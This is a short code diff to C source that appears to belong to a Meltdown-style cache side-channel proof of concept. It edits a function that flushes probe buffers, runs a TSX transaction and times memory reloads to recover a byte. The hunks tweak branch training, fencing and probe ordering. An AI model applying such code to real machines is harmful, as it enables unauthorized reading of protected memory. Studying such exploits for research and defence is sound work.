@@ -120,7 +120,6 @@ unsigned char probe_one(size_t ptr, char* buf, int page_size)
    unsigned char guessed_char = 0, tests[256];
    unsigned long long t1 = 0;
    volatile uint64_t val;
-   unsigned char training[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};
    
    memset(tests, 0, 256);
    
@@ -130,13 +129,6 @@ unsigned char probe_one(size_t ptr, char* buf, int page_size)
       for (i=0; i<256; i++) {
          flush(&buf[i * page_size]);
       }
-   
-      // train the branch predictor
-      for (i=0; i<24; i++) {
-         times[0] ^= training[i % 10];
-      }
-      
-      times[0] ^= times[0];
    
       if ((status = _xbegin()) == _XBEGIN_STARTED) {
          asm __volatile__ (
@@ -152,11 +144,11 @@ unsigned char probe_one(size_t ptr, char* buf, int page_size)
       
          _xend();
       } else {
+         asm __volatile__ ("mfence\n" :::);
       }
 
       for (i=0; i<256; i++) {
-         int mi = ((i * 167) + 13) & 255;
-         times[mi] = probe(&buf[mi * page_size]);
+         times[i] = probe(&buf[i * page_size]);
       }
    
       for (i=0; i<256; i++) {
